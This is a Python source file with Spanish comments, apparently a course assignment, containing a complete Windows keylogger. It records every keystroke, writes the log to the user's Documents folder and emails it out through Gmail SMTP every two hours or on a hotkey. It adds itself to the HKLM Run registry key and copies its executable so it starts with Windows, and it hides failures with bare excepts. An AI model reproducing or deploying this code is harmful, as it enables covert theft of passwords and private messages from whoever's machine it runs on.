"""
GcanDev
"""
import sys
import shutil
import keyboard  # Para acceder al teclado
import smtplib  # Para enviar correos utilizando el protocolo SMTP
from threading import Timer #Para ejecutar fiunciones después de un intervalo de tiempo
from pathlib import Path #Para obtener la ruta del home del usuario que inicia sesión
from win32api import (GetModuleFileName, RegCloseKey, RegDeleteValue,
                      RegOpenKeyEx, RegSetValueEx)
from win32con import HKEY_LOCAL_MACHINE, KEY_WRITE, REG_SZ
import os
# con estos imports de win32 haremos que el programa se ejecute cada ve que inicia windows
# y esta SUBKEY es el lugar del registro de windows donde se guardan estas aplicaciones
SUBKEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

home = str(Path.home()) #como guardamos el archivo en la carpeta del usuario, sacamos el Path
#Guardamos en el archivo cada 20 segundos, y enviamos mail cada 2 horas
# el INTERVALO_EMAIL equivale a la cantidad de veces que se guarda en archivo antes de enviar mail
# tiempo en segundos email = INTERVALO_EMAIL * INTERVALO_GUARDADO_ARCHIVO
# Valores según pide el enunciado de la práctica:
INTERVALO_EMAIL = 360 # 360 * 20 = 7200 seg = 2horas modificar para enviar mail más seguidos.
INTERVALO_GUARDADO_ARCHIVO = 20  # 20 segundos. Modificar para alterar guardado en archivo
INTERVALO_SALTO_LINEA = 15 # Pasados 5min sin escribir, se hace un salto de línea
DIRECCION_EMAIL = "AQUÍ LA DIRECCIÓN DE EMAIL" #Email creado exclusivamente para este ejercicio
PASS_EMAIL = "AQUÍ TU CONTRASEÑA DEL EMAIL" #Contraseña del email. Usada solo en este email.
EXPORT_MANUAL = "ctrl+shift+i" #Esta es la combinación de teclas para exportar manualmente

class Keylogger:
    def __init__(self, interval):
        self.interval = interval #se corresponderá con INTERVALO_GUARDADO_ARCHIVO
        self.log = "" #string donde guardaremos la lectura de teclado y pasaremos a archivo
        self.log_mail = "" #string donde guardaremos la lectura de teclado y enviaremos por mail
        self.contador = 0 #para utilizar un solo Timer y tener 2 cuentas atrás
        self.salto_linea = 0 #para contar que si pasan 5min sin pulsar tecla se haga un salto de linea
        self.export = "" #string que se utilizará como secuencia para exportar manualmente
    def callback(self, event):
        """
        Cada vez que se pulsa y se libera una tecla del teclado, se genera un evento
        que captura esta función.
        Lo que hace aquí es almacenar en el string la tecla pulsada, pero si se trata
        de algún tipo de tecla especial (ESC, ENTER, ALT, CTRL...) lo formatea y lo añade            al log.
        Tenemos 2 log, uno para el archivo y otro para el mail, esto se hace para ir
        vaciando el contenido del log del archivo más seguido.
        """

        tecla_detectada = event.name
        if len(tecla_detectada) > 1:
            if tecla_detectada == "space": #si detecta un espacio, deja un espacio en blanco
                tecla_detectada = " "
            elif tecla_detectada == "enter": #si detecta INTRO, salta de línea
                tecla_detectada = " \n "
            elif tecla_detectada == "decimal": #si se pulsa tecla decimal, escribe un punto
                tecla_detectada = "."
            else:
                #cualquier otra tecla especial la guarda en mayus y entre corchetes ej:[ALT]
                tecla_detectada = tecla_detectada.replace(" ", "_")
                tecla_detectada = f"[{tecla_detectada.upper()}]"
        # Después de dar formato a las teclas especiales, las almacena en los logs
        self.log += tecla_detectada
        self.log_mail += tecla_detectada

    def exportar_logs(self):
        """
        Cada vez que transcurre el tiempo definido en INTERVALO_GUARDADO_ARCHIVO se ejecuta
        esta función. Lo que hace es guardar el log en el archivo y reiniciarlo.
        El mail se envía cada vez que el contador llega al valor especificado por INTERVALO_EMAIL
        y después se vacía el log_mail.
        """
        if self.log and self.log != "\n": #si hay datos en el log, se guarda en el archivo.
            self.guardar_en_archivo() #guardamos en archivo
            self.log = ""  # cada vez que se guarda el log en archivo, se vacía la variable
            self.salto_linea = 0 #cuando detecta que hay algo en el log nuevo, diferente de
            # salto de linea, resetea el contador a 0.
        else: #si el log esta vacío o es un salto de línea
            self.salto_linea += 1 #suma 1 al contador y cuando llega al valor indicado,
            if self.salto_linea == INTERVALO_SALTO_LINEA: #introduce un salto de linea en cada log
                self.log += "\n"
                self.log_mail += "\n"
        self.contador += 1  # incrementamos el contador

        if  self.contador == INTERVALO_EMAIL:
            #cuando el contador llega al valor especificado y el log_mail NO está vacío
            if self.log_mail and self.log != "\n":
                self.enviar_mail(DIRECCION_EMAIL, PASS_EMAIL, self.log_mail) #enviamos mail
                self.log_mail = "" #y se vacía el contenido del log_mail
            self.contador = 0  # una vez se envía el mail, el contador se pone a cero

        # este Timer lanza la funcion report cada X segundos especificados en la variable interval
        timer = Timer(interval=self.interval, function=self.exportar_logs)
        timer.daemon = True #el timer muere cuando el main finaliza
        timer.start() #iniciamos el Timer

    def guardar_en_archivo(self):
        """
        Esta función se encarga de almacenar en el archivo pulsaciones_grabadas.txt
        el contenido del log. Se almacena en la carpeta Documentos perteneciente al
        usuario que inicia sesión.
        El modo escritura es append, para que cree el archivo si no existe, y en caso
        de existir, añada el contenido del log al final del archivo
        """
        with open(home + f"\\Documents\\pulsaciones_grabadas.txt", "a") as f:
            print(self.log, file=f)

    def enviar_mail(self, email, password, message):
        """
        Esta función se encarga de enviar por gmail el contenido del log_mail que recibe
        por parámetro.
        Corresponde al ejercicio 1b.
        """
        #función que envía el mail via gmail, con los datos introducidos arriba.
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def exportar_manual(self):
        """
        Esta función se llama para exportar manualmente los contenidos de los logs,
        tanto en el archivo de texto como en el email.
        Corrresponde al apartado 1
        """
        self.guardar_en_archivo()  # guardamos en archivo
        self.log = ""  # cada vez que se guarda el log en archivo, se vacía la variable
        self.enviar_mail(DIRECCION_EMAIL, PASS_EMAIL, self.log_mail)  # enviamos mail
        self.log_mail = ""  # y se vacía el contenido del log_mail

    def start(self):
        """"
        Esta funcion inicia la clase keylogger.
        Se incluye una combinación de teclas definida arriba, que al pulsar
        exporta los contenidos de los logs manualmente como pide el ejercicio 1e.

        Por otro lado, al pulsar y soltar una tecla del teclado, llama al callback
        que se ocupa de almacenar las teclas pulsadas en las variables
        que he llamado log, una para el archivo txt y otra para enviar por mail
        A continuación llama a la funcion y empieza el proceso de enviar los logs
        """
        keyboard.add_hotkey(EXPORT_MANUAL, self.exportar_manual, args=())
        keyboard.on_release(callback=self.callback)
        self.exportar_logs()
        keyboard.wait()

    def ejecutar_al_iniciar(self, appname, path):
        """
        Esta función inserta una nueva entrada en el registro de windows para que
        nuestro keylogger se inicie automáticamente cada vez que arranque windows
        :param appname: nombre de la aplicación que aparecerá en el registro
        :param path: ubicación del ejecutable
        """
        key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, SUBKEY, 0, KEY_WRITE)
        RegSetValueEx(key, appname, 0, REG_SZ, path)
        RegCloseKey(key)

if __name__ == "__main__":
    
    #con esto conseguimos la ruta del ejecutable para copiarlo después y que windows
    # ejecute el keylogger cuando se incie.
    if getattr(sys, 'frozen', False):
        application_path = os.path.dirname(sys.executable)
    elif __file__:
        application_path = os.path.dirname(__file__)
    path = os.path.join(application_path, "pec3.exe") #desde aqui se ejecuta el keylogger
    destino = home + f"\\Documents\\pec3.exe" #aqui se copiara

    # creamos una instancia de la clase Keylogger
    keylogger = Keylogger(interval=INTERVALO_GUARDADO_ARCHIVO)
    try: #Para modificar el registro son necesarios privilegios de administrador, en caso de
        keylogger.ejecutar_al_iniciar("FC PEC3", destino)  #NO tenerlos, no ejecutará esta línea
    except:
        pass
    try:
        shutil.copy(path, destino)  # copia el exe en la carpeta Documentos.
    except:
        pass
    keylogger.start() # iniciamos el keylogger
